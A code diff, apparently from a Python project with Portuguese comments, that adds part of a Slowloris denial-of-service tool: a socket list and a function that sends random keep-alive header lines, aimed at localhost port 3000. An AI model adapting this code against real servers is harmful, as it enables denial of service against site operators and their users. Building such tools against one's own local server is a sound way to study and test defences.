@@ -10,6 +10,7 @@ HEADERS = [
     b"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0",
     b"pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7"
 ]
+lista_sockets = []
 
 HOST_ALVO = "127.0.0.1" # localhost
 PORTA_ALVO = 3000
@@ -33,3 +34,16 @@ def init_socket():
             socket_atck = None
 
     return socket_atck
+
+def enviar_header(socket_atck):
+    if socket_atck:
+        try:
+            string = f"X-a: {random.randint(1, 5000)}\r\n"
+            socket_atck.send(string.encode("utf-8"))
+        except OSError as err:
+            print(f"erro de socket: {err} matando socket")
+            socket_atck.close()
+            lista_sockets.remove(socket_atck)
+
+
+# implementação slowloris
